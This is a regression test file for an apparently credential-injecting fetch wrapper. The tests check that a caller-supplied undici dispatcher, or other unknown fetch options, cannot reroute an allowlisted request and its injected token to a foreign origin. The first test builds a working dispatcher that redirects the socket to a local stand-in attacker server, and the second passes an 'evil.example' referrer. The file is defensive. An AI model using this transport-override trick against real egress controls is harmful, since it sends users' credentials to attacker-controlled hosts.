/**
 * The egress gates decide which URL may receive a credential. `fetch` options can decide where the
 * socket actually goes — undici honours `dispatcher`, which replaces the transport outright.
 *
 * `ConnectionHandle.fetch` used to build its outbound request as `{ ...init, method, headers, ... }`,
 * which forwarded every unknown caller key, `dispatcher` included. A request whose URL passed all
 * eight egress gates could therefore still deliver the injected credential to an arbitrary origin.
 * That is reachable wherever a host forwards model-influenced fetch options into `handle.fetch` —
 * the generic-HTTP-tool shape — and it contradicts the threat model's "Network redirect / egress
 * bypass: mitigated".
 *
 * The outbound init is now built from an allowlist (see `outboundInit`). These tests fail against
 * the old spread.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import net from 'node:net';
import { Agent } from 'undici';
import { openTestDb } from './support/pg';
import { listen } from './support/http';
import { Vault } from '../src/core/vault';
import { Audit } from '../src/core/audit';
import { ConnectionHandle } from '../src/core/injector';
import { defineProvider } from '../src/core/providers';
import { userOwner } from '../src/core/owner';
import type { SlackIdentity } from '../src/core/identity';

const KEY = Buffer.alloc(32, 9);
const ID: SlackIdentity = { enterpriseId: null, teamId: 'T1', userId: 'U1' };
const SECRET = 'tok-MUST-NOT-REACH-A-FOREIGN-ORIGIN';

function provider() {
  return defineProvider({
    id: 'acme',
    authorizeUrl: 'https://acme.example/a',
    tokenUrl: 'https://acme.example/t',
    clientId: 'c',
    clientSecret: 's',
    scopesDefault: [],
    egressAllow: ['api.acme.example'], // 127.0.0.1 is NOT allowlisted
    refresh: 'none',
    pkce: false,
  });
}

test('init.dispatcher cannot redirect the injected credential to a non-allowlisted origin', async (t) => {
  // A listener standing in for an attacker-controlled origin.
  const received: string[] = [];
  const evil = http.createServer((req, res) => {
    received.push(String(req.headers.authorization ?? ''));
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end('{}');
  });
  const port = await listen(t, evil);

  const db = await openTestDb(t);
  const vault = new Vault(db, KEY);
  await vault.upsert(userOwner(ID), 'acme', {
    accessToken: SECRET, refreshToken: null, scopes: '', expiresAt: null, externalAccount: null,
  });
  const handle = new ConnectionHandle(provider(), userOwner(ID), ID, vault, new Audit(db));

  // The URL is a perfectly valid allowlisted target: every egress gate passes. Only the transport
  // is subverted.
  const dispatcher = new Agent({
    connect: (_opts: unknown, cb: (err: Error | null, s: net.Socket) => void) => {
      const s = net.connect(port, '127.0.0.1', () => cb(null, s));
    },
  } as ConstructorParameters<typeof Agent>[0]);

  await handle
    .fetch('https://api.acme.example/user', { dispatcher } as RequestInit)
    .catch(() => undefined); // however it ends, the credential must not have left

  assert.equal(
    received.length, 0,
    `a non-allowlisted origin received ${received.length} request(s) through init.dispatcher`,
  );
  assert.ok(
    !received.some((h) => h.includes(SECRET)),
    'the injected credential reached a non-allowlisted origin',
  );
});

test('unknown init keys are dropped, while method, headers and body still work', async (t) => {
  const db = await openTestDb(t);
  const vault = new Vault(db, KEY);
  await vault.upsert(userOwner(ID), 'acme', {
    accessToken: SECRET, refreshToken: null, scopes: '', expiresAt: null, externalAccount: null,
  });
  const p = defineProvider({ ...provider(), egressMethods: ['GET', 'POST'] } as ReturnType<typeof provider>);
  const handle = new ConnectionHandle(p, userOwner(ID), ID, vault, new Audit(db));

  const real = globalThis.fetch;
  let seen: RequestInit | undefined;
  globalThis.fetch = (async (_i: string, i?: RequestInit) => {
    seen = i;
    return new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } });
  }) as typeof fetch;
  try {
    await handle.fetch('https://api.acme.example/x', {
      method: 'POST',
      body: 'hello',
      headers: { 'x-caller': 'kept' },
      // None of these may reach fetch:
      dispatcher: {},
      cache: 'no-store',
      credentials: 'include',
      referrer: 'https://evil.example',
    } as RequestInit);
  } finally {
    globalThis.fetch = real;
  }

  const forwarded = seen as (RequestInit & { dispatcher?: unknown }) | undefined;
  assert.ok(forwarded, 'fetch was called');
  assert.equal(forwarded?.dispatcher, undefined, 'dispatcher must not be forwarded');
  assert.equal((forwarded as { cache?: unknown })?.cache, undefined, 'cache must not be forwarded');
  assert.equal((forwarded as { credentials?: unknown })?.credentials, undefined, 'credentials must not be forwarded');
  assert.equal((forwarded as { referrer?: unknown })?.referrer, undefined, 'referrer must not be forwarded');

  // The legitimate fields still cross, and Vouchr's own controls are set.
  assert.equal(forwarded?.method, 'POST');
  assert.equal(forwarded?.body, 'hello');
  assert.equal(forwarded?.redirect, 'manual');
  assert.ok(forwarded?.signal, 'the composed deadline signal is attached');
  assert.equal(new Headers(forwarded?.headers).get('x-caller'), 'kept', 'caller headers survive');
  assert.ok(
    new Headers(forwarded?.headers).get('authorization')?.includes(SECRET),
    'the credential is still injected on the allowed path',
  );
});
